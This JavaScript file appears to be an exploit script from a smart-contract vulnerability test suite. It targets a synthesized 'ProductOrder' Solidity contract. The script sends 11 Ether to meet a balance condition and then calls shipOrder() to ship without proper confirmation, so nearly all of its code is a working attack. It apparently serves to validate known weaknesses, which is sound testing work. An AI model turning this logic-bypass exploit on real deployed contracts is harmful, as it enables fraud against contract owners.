require('module-alias/register');
const fs = require('fs');
const path = require('path');
const assert = require('assert');
const chalk = require('chalk');
const { 
    extractSolcVersion, 
    compileWithVersion, 
    deployContract 
} = require('@lib/web3/deploy');
const { sleep } = require('@lib/os/process');

const { createLoggerWeb3 } = require('@lib/web3/deploy');


const projectRoot = path.resolve(__dirname, '..', '..', '..'); 
const contractsDir = path.join(projectRoot, './contracts');
let contractFileFullName = 'ProductOrder-15.sol';
let source = fs.readFileSync(path.join(contractsDir, 'src', 'synthesized', contractFileFullName), 'utf8');


async function exploit(web3, envInfo, contractAddress) {
    try {   
        let solcVersion = extractSolcVersion(source);
        let { abi } = await compileWithVersion(source, contractFileFullName, 'ProductOrder', solcVersion);
        
        let contractInstance = new web3.eth.Contract(abi, contractAddress);

        console.log("Sending Ether to fulfill the balance condition for shipping...");

        // Send enough ether to trigger the balance condition
        let sendEther = await web3.eth.sendTransaction({
            from: web3.eth.accounts.wallet[0].address,
            to: contractAddress,
            value: web3.utils.toWei('11', 'ether'),  // Send 11 Ether to surpass the 10 Ether condition
            gas: 3000000
        });
        await sleep(200);

        if (sendEther) {
            console.log("Ether sent successfully. Attempting to ship order...");

            let shipReceipt = await contractInstance.methods.shipOrder().send({
                from: web3.eth.accounts.wallet[0].address,
                gas: 3000000
            });
            await sleep(200);

            if (shipReceipt.status) {
                console.log("Order shipped successfully without proper confirmation.");
                return true;
            } else {
                console.error("Failed to ship order.");
                return false;
            }
        } else {
            console.error("Failed to send Ether.");
            return false;
        }
    } catch (error) {
        console.error("Failed to execute exploit due to:", error.stack);
        return false;
    }
}


module.exports = async function runTests(web3, envInfo, contractAddress) {
    web3 = await createLoggerWeb3(web3);
    let result = await exploit(web3, envInfo, contractAddress);
    console.log(chalk.blue(`Result of running the exploit is: ${result}`));
    return result; 
}
